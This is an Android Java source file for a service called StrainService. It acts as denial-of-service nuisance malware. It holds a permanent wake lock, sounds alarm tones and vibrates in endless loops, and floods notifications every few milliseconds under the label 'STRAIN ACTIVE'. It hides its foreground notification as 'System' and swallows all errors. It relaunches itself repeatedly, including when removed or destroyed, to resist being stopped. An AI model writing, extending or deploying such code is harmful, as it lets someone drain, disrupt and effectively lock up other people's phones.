package com.rhfvnc.strain;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.ToneGenerator;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
public class StrainService extends Service {
    private PowerManager.WakeLock wl;
    private Vibrator vib;
    private ToneGenerator tone;
    public static void start(Context c) {
        Intent i = new Intent(c, StrainService.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
        else c.startService(i);
    }
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            Notification n = Notify.build(this, "rhfvnc", "System", "Running");
            startForeground(1, n);
        } catch (Throwable ignored) {}
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            try {
                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "rhfvnc:strain");
                wl.setReferenceCounted(false);
                wl.acquire();
            } catch (Throwable ignored) {}
        }
        vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        try {
            tone = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
            tone.startTone(ToneGenerator.TONE_CDMA_ABBR_ALERT, 60000);
        } catch (Throwable ignored) {}
        Thread alarmLoop = new Thread(() -> {
            while (true) {
                try { StrainReceiver.scheduleRelaunch(StrainService.this, 20); Thread.sleep(100); }
                catch (Throwable ignored) {}
            }
        });
        alarmLoop.setDaemon(true); alarmLoop.start();
        Thread vibLoop = new Thread(() -> {
            while (true) {
                try { if (vib != null) vib.vibrate(new long[]{0, 60, 20, 60, 20}, -1); Thread.sleep(90); }
                catch (Throwable ignored) {}
            }
        });
        vibLoop.setDaemon(true); vibLoop.start();
        Thread toneLoop = new Thread(() -> {
            while (true) {
                try { if (tone != null) tone.startTone(ToneGenerator.TONE_CDMA_ABBR_ALERT, 5000); }
                catch (Throwable ignored) {}
                try { Thread.sleep(4500); } catch (InterruptedException ignored) {}
            }
        });
        toneLoop.setDaemon(true); toneLoop.start();
        Thread spam = new Thread(() -> {
            android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            int id = 100;
            while (true) {
                try {
                    if (nm != null) {
                        Notification nn = Notify.build(StrainService.this, "rhfvnc", "RHF/VNC", "STRAIN ACTIVE");
                        nm.notify(id++, nn);
                        if (id > 200) id = 100;
                    }
                } catch (Throwable ignored) {}
                try { Thread.sleep(5); } catch (InterruptedException ignored) {}
            }
        });
        spam.setDaemon(true); spam.start();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        StrainService.start(this);
        StrainReceiver.scheduleRelaunch(this, 20);
    }
    @Override
    public void onDestroy() {
        try { if (tone != null) tone.release(); } catch (Throwable ignored) {}
        StrainService.start(this);
        super.onDestroy();
    }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
